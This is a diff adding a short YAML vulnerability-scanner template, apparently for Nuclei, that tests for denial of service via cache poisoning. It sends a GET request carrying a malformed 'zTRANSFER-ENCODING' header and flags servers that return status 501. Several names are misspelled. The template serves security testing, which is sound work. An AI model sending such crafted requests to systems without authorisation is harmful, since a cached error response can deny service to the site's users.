@@ -1,0 +1,28 @@
+id: DOS_via_Cache-Poisoing
+
+info:
+  name: Denial of Service via Cache Poisoing
+  author: abdulrahman
+  severity: medium
+  tags: generic
+
+requests:
+  - raw:
+    - |
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      User-Agnet: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+      DNT: 1
+      zTRANSFER-ENCODING: abdul
+      Upgrade-Insecure-Requests: 1
+
+
+    matchers:
+      - type: status
+        status: 
+          - 501
+
+
+
+
+
